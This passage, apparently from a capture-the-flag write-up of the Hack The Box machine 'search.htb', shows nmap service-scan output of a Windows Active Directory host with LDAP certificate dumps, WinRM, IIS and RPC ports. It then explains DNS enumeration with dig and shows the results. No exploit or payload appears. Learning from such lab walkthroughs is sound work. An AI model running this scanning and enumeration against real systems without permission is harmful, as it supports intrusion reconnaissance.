</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U</span><span style="color:#f92672">+</span><span style="color:#66d9ef">Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">/</span>lPqiPHGIs7mRW<span style="color:#f92672">/</span>zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>pdPzYPnCzHLoO<span style="color:#f92672">/</span><span style="color:#66d9ef">BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ</span><span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">18</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3268</span><span style="color:#f92672">/</span>tcp  open  ldap          syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: search<span style="color:#f92672">.</span>htb0<span style="color:#f92672">.</span>, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>research
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>search<span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span><span style="color:#f92672">-</span><span style="color:#66d9ef">CA</span><span style="color:#f92672">/</span>domainComponent<span style="color:#f92672">=</span>search
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   <span style="color:#ae81ff">073</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">614</span>f <span style="color:#ae81ff">7</span>bc0 <span style="color:#ae81ff">29</span>d0 <span style="color:#ae81ff">6</span>d1d <span style="color:#ae81ff">9</span>ea6 <span style="color:#ae81ff">3</span>cdb d99e
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">10</span>ae <span style="color:#ae81ff">5494</span> <span style="color:#ae81ff">29</span>d6 <span style="color:#ae81ff">1e44</span> <span style="color:#ae81ff">276</span>f b8a2 <span style="color:#ae81ff">24</span>ca fde9 de93 af78
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIFZzCCBE</span><span style="color:#f92672">+</span>gAwIBAgITVAAAABRx<span style="color:#f92672">/</span><span style="color:#66d9ef">RXdaDt</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>wAAAAAAFDANBgkqhkiG9w0BAQsF
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">JT1TzlSgPMw6koXP0a8uR</span><span style="color:#f92672">+</span>nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa</span><span style="color:#f92672">/</span>b<span style="color:#f92672">/+</span><span style="color:#66d9ef">C0Zh5PlBWeoYLSru</span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U</span><span style="color:#f92672">+</span><span style="color:#66d9ef">Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">/</span>lPqiPHGIs7mRW<span style="color:#f92672">/</span>zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>pdPzYPnCzHLoO<span style="color:#f92672">/</span><span style="color:#66d9ef">BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ</span><span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">18</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3269</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>ldap      syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: search<span style="color:#f92672">.</span>htb0<span style="color:#f92672">.</span>, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>research
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>search<span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span><span style="color:#f92672">-</span><span style="color:#66d9ef">CA</span><span style="color:#f92672">/</span>domainComponent<span style="color:#f92672">=</span>search
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   <span style="color:#ae81ff">073</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">614</span>f <span style="color:#ae81ff">7</span>bc0 <span style="color:#ae81ff">29</span>d0 <span style="color:#ae81ff">6</span>d1d <span style="color:#ae81ff">9</span>ea6 <span style="color:#ae81ff">3</span>cdb d99e
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">10</span>ae <span style="color:#ae81ff">5494</span> <span style="color:#ae81ff">29</span>d6 <span style="color:#ae81ff">1e44</span> <span style="color:#ae81ff">276</span>f b8a2 <span style="color:#ae81ff">24</span>ca fde9 de93 af78
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIFZzCCBE</span><span style="color:#f92672">+</span>gAwIBAgITVAAAABRx<span style="color:#f92672">/</span><span style="color:#66d9ef">RXdaDt</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>wAAAAAAFDANBgkqhkiG9w0BAQsF
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">/</span>lPqiPHGIs7mRW<span style="color:#f92672">/</span>zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>pdPzYPnCzHLoO<span style="color:#f92672">/</span><span style="color:#66d9ef">BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ</span><span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">17</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5985</span><span style="color:#f92672">/</span>tcp  open  http          syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">HTTPAPI</span> httpd <span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span> (<span style="color:#66d9ef">SSDP</span><span style="color:#f92672">/</span><span style="color:#66d9ef">UPnP</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span><span style="color:#e6db74">header</span>: <span style="color:#66d9ef">Microsoft</span><span style="color:#f92672">-</span><span style="color:#66d9ef">HTTPAPI</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span><span style="color:#e6db74">title</span>: <span style="color:#66d9ef">Not</span> <span style="color:#66d9ef">Found</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8172</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>http      syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">IIS</span> httpd <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span><span style="color:#66d9ef">WMSvc</span><span style="color:#f92672">-</span><span style="color:#66d9ef">SHA2</span><span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span><span style="color:#66d9ef">WMSvc</span><span style="color:#f92672">-</span><span style="color:#66d9ef">SHA2</span><span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span><span style="color:#e6db74">T09</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">05</span><span style="color:#e6db74">T09</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   eeb9 <span style="color:#ae81ff">303</span>e <span style="color:#ae81ff">6</span>d46 bd8b <span style="color:#ae81ff">34</span>a0 <span style="color:#ae81ff">1</span>ed6 <span style="color:#ae81ff">0</span>eb8 <span style="color:#ae81ff">3287</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">1e06</span> <span style="color:#ae81ff">9</span>fd0 ef45 b051 <span style="color:#ae81ff">78</span>b2 c6bf <span style="color:#ae81ff">1</span>bed <span style="color:#ae81ff">975</span>e a87d <span style="color:#ae81ff">045</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIC7TCCAdWgAwIBAgIQcJlfxrPWrqJOzFjgO04PijANBgkqhkiG9w0BAQsFADAe</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MRwwGgYDVQQDExNXTVN2Yy1TSEEyLVJFU0VBUkNIMB4XDTIwMDQwNzA5MDUyNVoX</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Zxq</span><span style="color:#f92672">/</span><span style="color:#66d9ef">NolqIVnehFn</span><span style="color:#f92672">/</span><span style="color:#ae81ff">36</span>tjc65v1wgo6KnHAQUt6zWufueeYS3k2f4JzvFn4aPtUYRi
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> nQgTuGbJTlxdVJ5DJjld9pLyJ<span style="color:#f92672">+</span><span style="color:#66d9ef">OctGeI1jRITiYlu5p3JwhxU0</span><span style="color:#f92672">+</span>mQjGT5mQZ<span style="color:#f92672">+</span><span style="color:#66d9ef">Umu</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> abMpffugMOPYnyHu8poRZWjKgNBN0ygmnqGbTjx57No5
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span><span style="color:#e6db74">header</span>: <span style="color:#66d9ef">Microsoft</span><span style="color:#f92672">-</span><span style="color:#66d9ef">IIS</span><span style="color:#f92672">/</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span><span style="color:#e6db74">title</span>: <span style="color:#66d9ef">Site</span> doesn<span style="color:#960050;background-color:#1e0010">'</span>t have a title<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">17</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> tls<span style="color:#f92672">-</span><span style="color:#e6db74">alpn</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  http<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9389</span><span style="color:#f92672">/</span>tcp  open  mc<span style="color:#f92672">-</span>nmf        syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">.</span>NET <span style="color:#66d9ef">Message</span> <span style="color:#66d9ef">Framing</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49666</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49669</span><span style="color:#f92672">/</span>tcp open  ncacn_http    syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span> over <span style="color:#66d9ef">HTTP</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49670</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49690</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49699</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">49725</span><span style="color:#f92672">/</span>tcp open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span></code></pre></div><p>Firstly, we are enumerating DNS; DNS allows us to look for more subdomains. Using a tool called <code>dig.</code> we are using some arguments called <code>any,</code> then we specify the hostname and the machine’s IP.</p>
<h3 id="dns">DNS</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Command =&gt; dig any @10.129.247.185 search.htb</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; <span style="color:#f92672">&lt;&lt;&gt;&gt;</span> <span style="color:#66d9ef">DiG</span> <span style="color:#ae81ff">9</span><span style="color:#f92672">.</span><span style="color:#ae81ff">17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Debian</span> <span style="color:#f92672">&lt;&lt;&gt;&gt;</span> any <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span><span style="color:#f92672">.</span><span style="color:#ae81ff">247</span><span style="color:#f92672">.</span><span style="color:#ae81ff">185</span> search<span style="color:#f92672">.</span>htb
</span></span><span style="display:flex;"><span>; (<span style="color:#ae81ff">1</span> server found)
</span></span><span style="display:flex;"><span>;; global <span style="color:#e6db74">options</span>: <span style="color:#f92672">+</span>cmd
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">Got</span> <span style="color:#e6db74">answer</span>:
</span></span><span style="display:flex;"><span>;; <span style="color:#f92672">-&gt;&gt;</span><span style="color:#66d9ef">HEADER</span><span style="color:#f92672">&lt;&lt;-</span> <span style="color:#e6db74">opcode</span>: <span style="color:#66d9ef">QUERY</span>, <span style="color:#e6db74">status</span>: <span style="color:#66d9ef">NOERROR</span>, id: <span style="color:#ae81ff">44478</span>
</span></span><span style="display:flex;"><span>;; <span style="color:#e6db74">flags</span>: qr aa rd ra; <span style="color:#e6db74">QUERY</span>: <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">ANSWER</span>: <span style="color:#ae81ff">4</span>, <span style="color:#e6db74">AUTHORITY</span>: <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">ADDITIONAL</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">OPT</span> <span style="color:#e6db74">PSEUDOSECTION</span>:
</span></span><span style="display:flex;"><span>; <span style="color:#e6db74">EDNS</span>: <span style="color:#e6db74">version</span>: <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">flags</span>:; <span style="color:#e6db74">udp</span>: <span style="color:#ae81ff">4000</span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">QUESTION</span> <span style="color:#e6db74">SECTION</span>:
</span></span><span style="display:flex;"><span>;search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>			<span style="color:#66d9ef">IN</span>	<span style="color:#66d9ef">ANY</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">ANSWER</span> <span style="color:#e6db74">SECTION</span>:
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>		<span style="color:#ae81ff">600</span>	<span style="color:#66d9ef">IN</span>	A	<span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">11</span><span style="color:#f92672">.</span><span style="color:#ae81ff">129</span>
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>		<span style="color:#ae81ff">3600</span>	<span style="color:#66d9ef">IN</span>	<span style="color:#66d9ef">NS</span>	research<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>		<span style="color:#ae81ff">3600</span>	<span style="color:#66d9ef">IN</span>	<span style="color:#66d9ef">SOA</span>	research<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span> hostmaster<span style="color:#f92672">.</span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span> <span style="color:#ae81ff">476</span> <span style="color:#ae81ff">900</span> <span style="color:#ae81ff">600</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">3600</span>
</span></span><span style="display:flex;"><span>search<span style="color:#f92672">.</span>htb<span style="color:#f92672">.</span>		<span style="color:#ae81ff">600</span>	<span style="color:#66d9ef">IN</span>	<span style="color:#66d9ef">AAAA</span>	<span style="color:#e6db74">dead</span>:beef<span style="color:#f92672">::</span><span style="color:#ae81ff">250</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>;; <span style="color:#66d9ef">ADDITIONAL</span> <span style="color:#e6db74">SECTION</span>:
